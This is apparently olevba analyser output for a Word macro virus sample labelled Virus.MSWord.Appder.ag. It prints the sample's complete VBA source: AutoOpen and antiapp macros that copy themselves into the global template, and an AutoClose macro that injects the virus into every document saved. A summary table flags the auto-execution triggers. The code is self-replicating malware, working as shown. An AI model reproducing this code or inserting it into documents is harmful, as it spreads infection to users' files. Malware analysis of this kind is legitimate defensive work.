olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Appder.ag
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Appder.ag - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Appder.ag - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
Funyour
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "antiapp" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":antiapp"
    WordBasic.MacroCopy sMacro$, "Global:antiapp"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub

Private Sub Funyour()
Dim WOpen$
Dim sales
On Error GoTo -1: On Error GoTo sale
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
sales = 1
WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
WordBasic.ToolsMacro Name:="Appder", Delete:=1
sale:
End Sub 'Funyour
-------------------------------------------------------------------------------
VBA MACRO antiapp.bas 
in file: ./Virus.MSWord.Appder.ag - OLE stream: 'Macros/VBA/antiapp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim iMacroCount
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
Funyour
On Error GoTo -1: On Error GoTo Quit
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then
        AClose = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "antiapp" Then
        Ad = -1
    End If
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":antiapp"
    WordBasic.MacroCopy sMacro$, "Global:antiapp"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
Quit:
End Sub

Private Sub Funyour()
Dim WOpen$
Dim sales
On Error GoTo -1: On Error GoTo sale
WOpen$ = WordBasic.[GetPrivateProfileString$]("Microsoft Word", " NTTHNTA", "WINWORD6.INI")
sales = 1
WordBasic.SetPrivateProfileString "Microsoft Word", "NTTHNTA", Str(sales), "WINWORD6.INI"
WordBasic.ToolsMacro Name:="Appder", Delete:=1
sale:
End Sub 'Funyour
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Appder.ag - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Quit
WordBasic.CurValues.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:antiapp", sTMacro$
sTMacro$ = sMe$ + ":antiapp"
WordBasic.MacroCopy "Global:antiapp", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
Quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

